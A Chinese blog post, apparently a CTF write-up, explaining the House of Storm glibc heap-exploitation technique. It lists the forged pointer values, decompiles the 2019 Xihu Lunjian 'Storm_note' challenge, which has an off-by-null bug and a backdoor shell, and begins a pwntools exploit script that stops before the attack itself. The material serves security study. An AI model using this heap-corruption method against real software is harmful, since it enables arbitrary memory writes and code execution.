<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Storm | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
 "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
  bszTag.texts(a),
  bszTag.shows()
}));reset()})</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Storm</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T09:16:41.819Z" id="updated"> 2023-09-12</time></div></span><br><span>Word Count: <div class="control">4.9k</div></span><br><span>Read Time: <div class="control">24 min</div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h2><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，<br>  这两个chunk需要在归位之后处于同一个largebin的index中，<br>  且unsortedbin中的chunk要比largebin中的大<br><span class="hljs-number">2</span>.需要unsorted_bin中的<span class="hljs-keyword">bk指针可控</span><br><span class="hljs-keyword"></span><span class="hljs-number">3</span>.需要largebin中的<span class="hljs-keyword">bk指针和bk_nextsize指针可控</span><br><span class="hljs-keyword"></span><span class="hljs-number">4</span>.glibc版本小于<span class="hljs-number">2</span>.<span class="hljs-number">30</span>,因为<span class="hljs-number">2</span>.<span class="hljs-number">30</span>之后加入了检查<br></code></pre></td></tr></tbody></table></figure>

<h3 id="largebin中size与index的对应关系"><a href="#largebin中size与index的对应关系" class="headerlink" title="largebin中size与index的对应关系"></a>largebin中size与index的对应关系</h3><figure class="highlight dns"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs dns">size    index<br>[<span class="hljs-number">0</span>x400 , <span class="hljs-number">0</span>x440)   	 <span class="hljs-number">64</span><br>[<span class="hljs-number">0</span>x440 , <span class="hljs-number">0</span>x480)    	 <span class="hljs-number">65</span><br>[<span class="hljs-number">0</span>x480 , <span class="hljs-number">0</span>x4C0)   	 <span class="hljs-number">66</span><br>[<span class="hljs-number">0</span>x4C0 , <span class="hljs-number">0</span>x500)   	 <span class="hljs-number">67</span><br>[<span class="hljs-number">0</span>x500 , <span class="hljs-number">0</span>x540)   	 <span class="hljs-number">68</span><br>等差 <span class="hljs-number">0</span>x40    …<br>[<span class="hljs-number">0</span>xC00 , <span class="hljs-number">0</span>xC40)    	 <span class="hljs-number">96</span><br>[<span class="hljs-number">0</span>xC40 , <span class="hljs-number">0</span>xE00)      <span class="hljs-number">97</span><br>[<span class="hljs-number">0</span>xE00 , <span class="hljs-number">0</span>x1000)     <span class="hljs-number">98</span><br>[<span class="hljs-number">0</span>x1000 , <span class="hljs-number">0</span>x1200)    <span class="hljs-number">99</span><br>[<span class="hljs-number">0</span>x1200 , <span class="hljs-number">0</span>x1400)    <span class="hljs-number">100</span><br>[<span class="hljs-number">0</span>x1400 , <span class="hljs-number">0</span>x1600)    <span class="hljs-number">101</span><br>等差 <span class="hljs-number">0</span>x200    …<br>[<span class="hljs-number">0</span>x2800 , <span class="hljs-number">0</span>x2A00)    <span class="hljs-number">111</span><br>[<span class="hljs-number">0</span>x2A00 , <span class="hljs-number">0</span>x3000)    <span class="hljs-number">112</span><br>[<span class="hljs-number">0</span>x3000 , <span class="hljs-number">0</span>x4000)    <span class="hljs-number">113</span><br>[<span class="hljs-number">0</span>x4000 , <span class="hljs-number">0</span>x5000)    <span class="hljs-number">114</span><br>等差 <span class="hljs-number">0</span>x1000    …<br>[<span class="hljs-number">0</span>x9000 , <span class="hljs-number">0</span>xA000)      <span class="hljs-number">119</span><br>[<span class="hljs-number">0</span>xA000 , <span class="hljs-number">0x10000</span>)     <span class="hljs-number">120</span><br>[<span class="hljs-number">0x10000</span> , <span class="hljs-number">0x18000</span>)    <span class="hljs-number">121</span><br>[<span class="hljs-number">0x18000</span> , <span class="hljs-number">0x20000</span>)    <span class="hljs-number">122</span><br>[<span class="hljs-number">0x20000</span> , <span class="hljs-number">0x28000</span>)    <span class="hljs-number">123</span><br>[<span class="hljs-number">0x28000</span> , <span class="hljs-number">0x40000</span>)    <span class="hljs-number">124</span><br>[<span class="hljs-number">0x40000</span> , <span class="hljs-number">0x80000</span>)    <span class="hljs-number">125</span><br>[<span class="hljs-number">0x80000</span> , …. )        <span class="hljs-number">126</span><br></code></pre></td></tr></tbody></table></figure>

<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>.将unsorted_bin中的bk指针改为fake_chunk<br><span class="hljs-number">2</span>.largebin中的bk指针改为fake_chunk<span class="hljs-number">+8</span>，bk_nextsize指针改为fake_chunk<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-number">-5</span>	<span class="hljs-punctuation">,</span><br>（<span class="hljs-keyword">target</span>为要修改的目标地址，fake_chunk为<span class="hljs-keyword">target</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>）<br> 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize <span class="hljs-operator">=</span> victim（即fake_chunk<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-number">-5</span><span class="hljs-operator">=</span>victim）<br><span class="hljs-number">3</span>.再次<span class="hljs-keyword">malloc</span>获得<span class="hljs-keyword">target</span>地址处的chunk，可修改<span class="hljs-keyword">target</span>地址处的值<br></code></pre></td></tr></tbody></table></figure>

<p>House_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。<br>之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. victim 为 <span class="hljs-number">0</span><br><span class="hljs-attribute">2</span>. IS_MMAPPED 为 <span class="hljs-number">1</span><br><span class="hljs-attribute">3</span>. NON_MAIN_ARENA 为 <span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure>

<p>0x56（二进制数为0101 0110）满足条件<br>0x55（二进制数为0101 0101）不满足条件<br>但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>fd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>bk = fake_chunk<br><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>fd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>bk = fake_chunk+<span class="hljs-number">8</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>fd_nextsize = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>bk_nextsize = fake_chunk - <span class="hljs-number">0</span>x18 -<span class="hljs-number">5</span><br></code></pre></td></tr></tbody></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2019-西湖论剑-Storm-note"><a href="#2019-西湖论剑-Storm-note" class="headerlink" title="2019 西湖论剑 Storm_note"></a>2019 西湖论剑 Storm_note<img src="https://img-blog.csdnimg.cn/7c6fe5147ccf463e93da3ca872c3ad58.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></h3><p>保护全开，实现四个功能，增改删退，ida查看伪代码<br>init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，<br>之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数</p>
<h4 id="init-proc-函数"><a href="#init-proc-函数" class="headerlink" title="init_proc()函数"></a>init_proc()函数</h4><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ssize_t init_proc()<br>{<br>  ssize_t result; <span class="hljs-regexp">//</span> rax<br>  int fd; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  setbuf(stdin, <span class="hljs-number">0</span>LL);<br>  setbuf(stdout, <span class="hljs-number">0</span>LL);<br>  setbuf(stderr, <span class="hljs-number">0</span>LL);<br>  <span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )                         <span class="hljs-regexp">//</span> mallopt(M_MXFAST,<span class="hljs-number">0</span>)将global_max_fast设置为<span class="hljs-number">0</span>,<br>                                                <span class="hljs-regexp">//</span> 这个值的意思是最大为多大的chunk归fastbin管理,<br>                                                <span class="hljs-regexp">//</span> 设置为<span class="hljs-number">0</span>表示这个程序中不再存在fastbin。<br>                                                <span class="hljs-regexp">//</span> 即本程序禁用了fastbin。<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( mmap(<span class="hljs-number">0</span>xABCD0000LL, <span class="hljs-number">0</span>x1000uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL) != <span class="hljs-number">0</span>xABCD0000LL )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  result = read(fd, <span class="hljs-number">0</span>xABCD0100LL, <span class="hljs-number">0</span>x30uLL);<br>  <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">48</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  return result;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p>calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">alloc_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span> &amp;&amp; note[i]; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">16</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"full!"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size ?"</span>);<br>    _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> &amp;&amp; size &lt;= <span class="hljs-number">0xFFFFF</span> )<br>    {<br>      note[i] = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);             <span class="hljs-comment">// calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</span><br>                                                <span class="hljs-comment">// </span><br>      note_size[i] = size;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done"</span>);<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid size"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p>存在off-by-null</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Index ?"</span>);<br>  _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0xF</span> &amp;&amp; note[size] )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    v2 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, note[size], note_size[size]);<br>    *(note[size] + v2) = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// off-by-null</span><br>                                                <span class="hljs-comment">// </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>无uaf</p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Index ?"</span>);<br>  _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; note[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(note[v1]);<br>    note[v1] = <span class="hljs-number">0LL</span>;<br>    note_size[v1] = <span class="hljs-number">0</span>;<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="一个后门函数"><a href="#一个后门函数" class="headerlink" title="一个后门函数"></a>一个后门函数</h4><p>要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __noreturn backdoor()<br>{<br>  char buf[<span class="hljs-number">56</span>]; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">0</span>h] [rbp-<span class="hljs-number">40</span>h] BYREF<br>  unsigned __int64 v1; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">38</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v1 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  puts(<span class="hljs-string">"If you can open the lock, I will let you in"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x30uLL);<br>  <span class="hljs-keyword">if</span> ( !memcmp(buf, <span class="hljs-number">0</span>xABCD0100LL, <span class="hljs-number">0</span>x30uLL) )<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。<br>2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack<br>3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell</p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>先把前面的东西写好</p>
<figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>#context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./Storm_note'</span>)<br><br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims		    :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br><br><br>def <span class="hljs-built_in">add</span>(size):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'1'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(size))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,text):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'2'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(<span class="hljs-built_in">index</span>))<br>  <span class="hljs-keyword">sa</span>(<span class="hljs-string">'Content'</span>,text)<br><br>def free(<span class="hljs-built_in">index</span>):<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'Choice'</span>,<span class="hljs-string">'3'</span>)<br>  <span class="hljs-keyword">sla</span>(<span class="hljs-string">'?'</span>,str(<span class="hljs-built_in">index</span>))<br></code></pre></td></tr></tbody></table></figure>

<p>首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin</p>
